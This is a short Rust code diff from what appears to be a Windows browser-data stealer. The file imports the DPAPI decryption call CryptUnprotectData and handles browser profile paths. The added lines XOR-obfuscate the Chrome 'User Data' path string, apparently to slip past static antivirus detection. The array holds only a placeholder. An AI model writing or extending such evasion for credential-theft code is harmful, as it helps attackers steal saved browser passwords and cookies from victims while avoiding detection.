@@ -5,6 +5,16 @@ use base64::{engine::general_purpose, Engine as _};
 use serde_json::Value;
 use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
 
+const XOR_KEY: u8 = 0x5A;
+
+fn xor_decrypt(data: &[u8]) -> String {
+    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
+}
+
+// Exemple pour le chemin "Google\Chrome\User Data"
+const CHROME_PATH_XOR: &[u8] = &[ /* XOR bytes */ ];
+fn get_chrome_path() -> String { xor_decrypt(CHROME_PATH_XOR) }
+
 struct BrowserInfo {
     name: &'static str,
     user_data: PathBuf,
